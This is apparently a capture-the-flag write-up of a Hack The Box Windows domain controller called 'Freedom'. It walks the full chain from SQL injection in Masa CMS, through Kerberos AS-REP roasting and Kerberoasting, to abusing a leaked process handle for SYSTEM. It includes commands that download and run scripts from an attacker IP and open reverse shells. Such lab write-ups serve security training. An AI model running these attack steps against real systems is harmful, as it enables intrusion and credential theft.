# Freedom

```console
inte@debian-pc:~$ sudo nmap -v -p- --min-rate 4000 10.129.243.208

Nmap scan report for 10.129.243.208
Host is up (0.097s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown
49681/tcp open  unknown
49694/tcp open  unknown
49727/tcp open  unknown
```

```console
inte@debian-pc:~$ sudo nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49671,49672,49681,49694,49727 -oN freedom.nmap 10.129.243.208

Nmap scan report for 10.129.243.208
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://freedom.htb/
| http-robots.txt: 6 disallowed entries 
|_/admin/ /core/ /modules/ /config/ /themes/ /plugins/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-14 13:13:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49727/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -14m21s
| smb2-time: 
|   date: 2024-12-14T13:14:33
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```

Based on the ports, it is a Domain Controller.  
I used `ldapsearch` to find the FQDN:

```console
inte@debian-pc:~$ ldapsearch -x -H ldap://10.129.243.208 -s base -b "" -LLL | grep dnsHostName
dnsHostName: DC1.freedom.htb
```

`/etc/hosts` has to be updated with the FQDN:

```text
10.129.243.208 DC1.freedom.htb freedom.htb DC1
```

<http://freedom.htb> is running Masa CMS v7.4.5:

```console
inte@debian-pc:~$ curl -I 'http://freedom.htb/index.cfm/'
HTTP/1.1 200 
Date: Sat, 14 Dec 2024 13:22:52 GMT
Server: Apache/2.4.52 (Ubuntu)
Strict-Transport-Security: max-age=1200
Generator: Masa CMS 7.4.5
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Content-Length: 15947
Set-Cookie: MXP_TRACKINGID=5EF0B326-4FF8-4D7F-BA2D85DC40E24A41;Path=/;Expires=Sun, 13-Dec-2054 21:14:21 UTC;HttpOnly
Set-Cookie: mobileFormat=false;Path=/;Expires=Sun, 13-Dec-2054 21:14:21 UTC;HttpOnly
SET-COOKIE: cfid=55e46f70-1a81-43d5-b283-1a4f0f4304f2;expires=Mon, 14-Dec-2054 13:22:51 GMT;path=/;HttpOnly;
SET-COOKIE: cftoken=0;expires=Mon, 14-Dec-2054 13:22:51 GMT;path=/;HttpOnly;
```

It is vulnerable to SQL injection: <https://projectdiscovery.io/blog/hacking-apple-with-sql-injection>  
`ghauri` can ease the exploitation:

```console
inte@debian-pc:~$ ghauri -u 'http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x' -p contenthistid
#.....SNIP.....
Ghauri identified the following injection point(s) with a total of 55 HTTP(s) requests:
---
Parameter: contenthistid (GET)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: method=processAsyncObject&object=displayregion&contenthistid=x\' AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)-- wXyW&previewID=x
---
```

Rummaging through the database, I found some tables worth looking:

```console
inte@debian-pc:~$ ghauri -u 'http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x' -p contenthistid --dbs
#.....SNIP.....
available databases [5]:
[*] sys
[*] information_schema
[*] dbMasaCMS
[*] performance_schema
[*] mysql

inte@debian-pc:~$ ghauri -u 'http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x' -p contenthistid -D dbMasaCMS --tables
#.....SNIP.....
Database: dbMasaCMS
[72 tables]
+-----------------------------------+
| toauthtokens                      |
| tclassextendrcsets                |
| tpermissions                      |
#.....SNIP.....
| tusers                            |
#.....SNIP.....
```

Hashes and other information are present within the `tusers` table:

```console
inte@debian-pc:~$ ghauri -u 'http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x' -p contenthistid -D dbMasaCMS -T tusers -C Fname,Lname,Email,password --dump
#.....SNIP.....
+-----------+-------+--------------------+--------------------------------------------------------------+
| Fname     | Lname | Email              | password                                                     |
+-----------+-------+--------------------+--------------------------------------------------------------+
| Justin    | Bret  | writer@freedom.htb | $2a$10$AkLq72X91r4vNDulSohflOU82RjVF8hALkdVTWWtaY.LDHCkZW5je |
| Esmeralda | Tylar | writer@freedom.htb | $2a$10$nnS3OmT6r7BvVcryxh5fi.vdUkdSN1eoy/0DCahhTshH.UklejP/m |
| Admin     | User  | admin@freedom.htb  | $2a$10$xHRN1/9qFGtMAPkwQeMLYes2ysff2K970UTQDneDwJBRqUP7X8g3q |
| Gregory   | Davis | writer@freedom.htb | $2a$10$yBgldtETEe3EYXWUgMQfyOGnQsBLLgKwHUo2d26cwFWftQ.MCsEzq |
| George    | Smith | writer@freedom.htb | $2a$10$yBgldtETEe3EYXWUgMQfyOc685W.rhBZCG.gnri8HrQsQ13ELDZpC |
| Jennifer  | Jones | writer@freedom.htb | $2a$10$yBgldtETEe3EYXWUgMQfyOGnQsBLLgKwHUo2d26cwFWftQ.MCsEzq |
+-----------+-------+--------------------+--------------------------------------------------------------+
```

The hashes were too slow to crack. I moved on to the Active Directory with usernames.  
[username-anarchy](https://github.com/urbanadventurer/username-anarchy) generates potential username formats from a list of names:

```console
inte@debian-pc:~$ echo -e 'Justing Bret\nEsmeralda Tylar\nAdmin User\nGregory Davis\nGeorge Smith\nJennifer Jones' > ~/names.txt
inte@debian-pc:~$ username-anarchy -i ~/names.txt > ~/usernames.txt
```

Use [kerbrute](https://github.com/ropnop/kerbrute) to validate the correct ones:

```console
inte@debian-pc:~$ sudo ntpdate freedom.htb
inte@debian-pc:~$ kerbrute userenum ~/usernames.txt --dc 10.129.243.208 -d freedom.htb
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/15/24 - Ronnie Flathers @ropnop

2024/12/15 07:45:05 >  Using KDC(s):
2024/12/15 07:45:05 >   10.129.243.208:88

2024/12/15 07:45:05 >  [+] VALID USERNAME:   j.bret@freedom.htb
2024/12/15 07:45:06 >  [+] VALID USERNAME:   e.tylar@freedom.htb
2024/12/15 07:45:06 >  Done! Tested 87 usernames (2 valid) in 1.045 seconds
```

[impacket](https://github.com/fortra/impacket)'s `GetNPUsers.py` determined that an account was AS-REProastable:

```console
inte@debian-pc:~$ echo -e 'j.bret\ne.tylar' > users.txt
inte@debian-pc:~$ GetNPUsers.py freedom.htb/ -usersfile users.txt
Impacket v0.13.0.dev0+20241206.82610.e9a47ffc - Copyright Fortra, LLC and its affiliated companies 

[-] User j.bret doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$e.tylar@FREEDOM.HTB:6743a68dfdc2480fffb44e6ccdbcdc97$6db87f0ee9f0f9e0ba4131208b43afd050d83685573f4063e2a19df1083e415e16f0ae5b8f267e0e4a78d12160bf13e1fc7264bb30bd586306dec503dcf9476b99658cc630c89650d2ea43f3358c58f1659890520e42d7169b550325325640b4acdf7c2da0959937e360de5569c964139682dfe6365ffbfaa37eb8f3d4ce83b67a23ce8d7bff9107a19c0e76d35aff59b4ad1e73f1f1a408d69e98b338a39371c34f59fb08335c38d6fb9635a25f657b9319f33b400f266ca69a5de4de07b071c9fb238917ccd68520c808dcdc13610e2092adb0a8ca5b150c69674aa21f4fa7286d26df07b426517282
```

The hash did not crack with passwords within `rockyou.txt`.  
In a domain with `UF_DONT_REQUIRE_PREAUTH` set on any account, AS-REP Kerberoasting can be performed on other accounts.  
[impacket](https://github.com/fortra/impacket)'s `GetUserSPNs.py` has `-no-preauth` option for the same:

```console
inte@debian-pc:~$ GetUserSPNs.py freedom.htb/ -no-preauth e.tylar -usersfile ~/users.txt
Impacket v0.13.0.dev0+20241206.82610.e9a47ffc - Copyright Fortra, LLC and its affiliated companies 

$krb5tgs$23$*j.bret$FREEDOM.HTB$j.bret*$a4bd23ea29be303abebe6661535d48fd$696240e4cbaaf364dca7035e68ead274d7ed60accd853fe153b331219c9d7910db79bad4882db6b78b16371a0837eed8be09f7c21e470b90ce58a6337ed7fabfe78a580e36fa42e3a8bfbb4da98a23315cf660dcbbdd2e614712886d0267ee431dfeb4ea8097e5c048496cbeb76a4d096dec011af75953594f46a8d15e44599012e75feef0f67fdf50fac789f722bac48ec1ac27cfc0dd15fd020469eecba70b59ad8c301418f103871f44ac2aa24546cb62b131acabed3843710d5ccdf38110c564c0fa1746ad5f222a45dccff402cc25714e3a69af1b8b02aebf3e2c4a7405ffb1926ec6cd45437efe476059b4235b4ab59c30aa1fb3a8cac70cb003e6b94173c1001775f363eef2b7f8327bef8f1f379d9ec125a652805990defe66cd4bc820fd4176a9f4966680ae4ea414b45e436b2f5a74675175f5ef6dd2f111da30c7c7334ff75c81395de427c0f8844f6cec4dbac9366156b8d7671484ef4bb85bfeb5407b8f0a4f3a0e6972a799cf71d33ddc5e551485be22519b0713ebec5d1f52c6fc3bff36899f8169b7748fe6d86f8684524cf5aa9231d641fb7c82902363c36f602967407322f6fd38a894d99b496b2fd8483783e20fa867b0cd1dfc292c0ed6a61290735bc93ac67a8aa219d7bbeece146ff7d8d9f277ab0af7a63ee098dc2dda7f4fe4a7296fb036ac216d57cae891f728185d6a58f0208946f3bde53148ec161d7f9adc87f7dac6030dca52c4eccf8b1d492e544ede11ea02c8900cdb2d881904972827cbc0530ae5144b41db816f9c353c6e61d1efb4bb7cc96a0610ea7b5177eb2f90ef2c4fc2442482f39621103d1146491822f9a03cd105df92d07b9d088100d632826f46ea6db3ba57bf5e861901a5eec452d2dd727fc1df8a9754247c3b917aab415bd4616d952dfdc1f43ee13ae7119d81231ba0afb115569b7e1b92b3cb6640739ef2873b714628076880267ae8a0ec34de2c0f89e19117cb27a405fe7e67b5551f41d69fcb613bde714965038c3a6c43c69b4eee4b40c3f8191f05f93113d23f0b7f5484d41daa29801fae43d851a9b1d60e18676dcf740d419c9273db60f9d3801276aba4f7da45f200f740ca2bb37c43766139d84138da933bc7df825b8d17a624b4246497ce3bd00924d65d1c4d801c405f430c6ee22326987955f102052d31639e07ce8d1c85dd35f39281ebebc98701bcf708772b836520f9716f83e54c178ff2e32de1f52cc457dc8c45d9984db95f001828ce51ea37c7ee6b7ce4c0e64f34a3317f0fd87db122cf8a681d385f4891def913a7d186b67994c08f1fe538169f8b63ae7062ceac7fdf6736193af27a4a53138fe061f00778ce9566853dd57927a1e48ae955a350a8d3243bd1a009f9729d11c8a7ad3650d37f447fbd40d16cfe36447af067285850abb3818d80d6f79758c5865f9a83a4879c99f5e6aae21a9083303c86b07abc52df63db12c2b3ddde261ff9d4bc1b1d83cf66385bc78e7b860de2
[-] Principal: e.tylar - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```

The hash cracks to `swordsoffreedom`.  
The `whoami` module in [NetExec](https://github.com/Pennyw0rth/NetExec) reveals information about the current user:

```console
inte@debian-pc:~$ nxc ldap 10.129.243.208 -d freedom.htb -u 'j.bret' -p 'swordsoffreedom' -M whoami
SMB         10.129.243.208   445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:freedom.htb) (signing:True) (SMBv1:False)
LDAP        10.129.243.208   389    DC1              [+] freedom.htb\j.bret:swordsoffreedom 
WHOAMI      10.129.243.208   389    DC1              distinguishedName: CN=Justin Bret,CN=Users,DC=freedom,DC=htb
WHOAMI      10.129.243.208   389    DC1              Member of: CN=Remote Management Users,CN=Builtin,DC=freedom,DC=htb
WHOAMI      10.129.243.208   389    DC1              name: Justin Bret
WHOAMI      10.129.243.208   389    DC1              Enabled: Yes
WHOAMI      10.129.243.208   389    DC1              Password Never Expires: Yes
WHOAMI      10.129.243.208   389    DC1              Last logon: 133787409666802330
WHOAMI      10.129.243.208   389    DC1              pwdLastSet: 133753672499578485
WHOAMI      10.129.243.208   389    DC1              logonCount: 32
WHOAMI      10.129.243.208   389    DC1              sAMAccountName: j.bret
WHOAMI      10.129.243.208   389    DC1              Service Account Name(s) found - Potentially Kerberoastable user!
WHOAMI      10.129.243.208   389    DC1              Service Account Name: HTTP/DC1.freedom.htb
```

`j.bret` is a member of the `Remote Management Users` group. Therefore, a WinRM shell can be obtained:

```console
inte@debian-pc:~$ evil-winrm -i 10.129.243.208 -u 'j.bret' -p 'swordsoffreedom'
```

Upgrade to [ConPtyShell](https://github.com/antonioCoco/ConPtyShell):

```console
*Evil-WinRM* PS C:\> IEX(IWR http://10.10.14.87:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.87 3001
```

User flag can be obtained:

```console
PS C:\Users\j.bret\Desktop> cat .\user.txt
HTB{c4n_y0u_pl34as3_cr4ck?} 
```

[PrivescCheck](https://github.com/itm4n/PrivescCheck) is a tool for scanning potential privilege escalation paths:

```console
PS C:\> IEX(IWR http://10.10.14.87:8000/PrivescCheck.ps1 -UseBasicParsing)
PS C:\> Invoke-PrivescCheck -Extended
```

```text
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Root folder permissions                           ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the current user has any modification right on ┃
┃ or within a folder located at the root of a 'fixed' drive.   ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
[*] Status: Informational (not vulnerable) 


Path            : C:\WSL
Modifiable      : True
ModifiablePaths : .\Ubuntu\flutter_windows.dll; .\Ubuntu\ubuntu.exe; .\Ubuntu\ubuntu_wsl_splash.exe; .\Ubuntu\url_launcher_windows_plugin.dll;
                  .\Ubuntu\rootfs\opt\lucee\tomcat\bin\catalina.bat; .\Ubuntu\rootfs\opt\lucee\tomcat\bin\ciphers.bat;
                  .\Ubuntu\rootfs\opt\lucee\tomcat\bin\configtest.bat; .\Ubuntu\rootfs\opt\lucee\tomcat\bin\digest.bat; ...
Vulnerable      : True
Description     : The current user has modification rights on this root folder. A total of 18 common application files were found. The current user has modification rights on some, or all of them.
```

The web application was running on Ubuntu in WSL. It explains the header on <http://freedom.htb/>

```text
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Service list (non-default)                        ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Get information about third-party services. It does so by    ┃
┃ parsing the target executable's metadata and checking        ┃
┃ whether the publisher is Microsoft.                          ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
[*] Status: Informational 


Name        : HealthCheck
DisplayName : HealthCheck
ImagePath   : C:\Users\Administrator\Documents\health.exe
User        : LocalSystem
StartMode   : Automatic

#.....SNIP.....
```

It is not a default service. A similar executable in present the user directory:

```console
PS C:\Users\j.bret\Desktop> ls

    Directory: C:\Users\j.bret\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/25/2024   7:03 AM          17920 HealthCheck.exe
-a----        12/2/2024   3:24 AM             27 user.txt
```

Furthermore, there's an exploitable leaked handle:

```text
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Exploitable leaked handles                        ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the current user has access to a process that  ┃
┃ contains a leaked handle to a privileged process, thread, or ┃
┃ file object.                                                 ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
[*] Status: Vulnerable - Medium 


Object                    : 0xffff8f812290d080
UniqueProcessId           : 2404
HandleValue               : 0xf0
GrantedAccess             : 0x1fffff
HandleAttributes          : 2
ObjectTypeIndex           : 7
ObjectType                : Process
ObjectName                :
TargetProcessId           : 6340
TargetProcessAccessRights : ALL_ACCESS
```

The handle is leaked by none other than `HealthCheck.exe`:

```console
PS C:\> ps | findstr 6340
     72       5      736       3416              6340   0 health
PS C:\> ps | findstr 2404
     53       4      588       2880       0.00   2404   1 HealthCheck
```

There are multiple resources on abusing leaked handles, including <https://web.archive.org/web/20240110040601/http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/>  
However, it can be autoexploited with [LeakedHandlesFinder](https://github.com/lab52io/LeakedHandlesFinder)

I modified `LeakedHandlesFinder.cpp` and rebuilt the solution:

```diff
-     _tcscpy_s(conf.ExploitCommand, MAX_PATH, _T("c:\\Windows\\System32\\cmd.exe"));
+     _tcscpy_s(conf.ExploitCommand, MAX_PATH, _T("C:\\Windows\\Tasks\\revshell.exe"));
```

I also compiled a reverse shell:

```console
inte@debian-pc:~$ x86_64-w64-mingw32-gcc -o revshell.exe revshell.c -lws2_32
```

Upload and execute:

```console
PS C:\Windows\Tasks> iwr 10.10.14.87:8000/LeakedHandlesFinder.exe -o LeakedHandlesFinder.exe
PS C:\Windows\Tasks> iwr 10.10.14.87:8000/revshell.exe -o revshell.exe
PS C:\Windows\Tasks> .\LeakedHandlesFinder.exe -a
#.....SNIP.....
==[PID 2404 MEDIUM_INTEGRITY HealthCheck.exe]===================================================================
   Date             : 23:37:25 15-12-2024
   Handle type      : Process (0xf0)
   Parent process Id: 6340 INTEGRITY_UNKNOWN
   Granted access   : 0x1fffff
   Name             : HandleProcessPid(6340)
   Exploitability   : Exploitable Handle
   [+] Created process with PID 6068
   [+] Exploit Success!
#.....SNIP.....
```

A privileged `nt authority\system` shell would be received:

```console
C:\> whoami
nt authority\system
```

The root flag can be read with this shell:

```console
C:\Users\Administrator\Desktop> type root.txt
HTB{l34ky_h4ndl3rs_4th3_w1n}
```
